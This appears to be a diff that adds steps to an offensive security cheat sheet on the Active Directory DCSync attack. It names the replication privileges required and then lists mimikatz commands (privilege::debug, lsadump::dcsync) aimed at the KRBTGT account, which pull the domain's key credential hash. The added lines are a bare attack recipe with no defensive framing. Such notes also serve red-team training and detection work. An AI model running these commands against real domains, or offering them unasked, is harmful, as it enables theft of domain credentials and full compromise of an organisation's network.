@@ -3,3 +3,9 @@
 ### Privileges: Replicate Directory Changes, Replicate Directory Changes All
 
 ### Usually, Administrators, Domain Admins and Enterprise Admins have this privilege in their accounts.
+
+### 1) mimikatz.exe
+
+#### 2) privilege::debug
+
+#### 3) lsadump::dcsync /user:KRBTGT_ACCOUNT
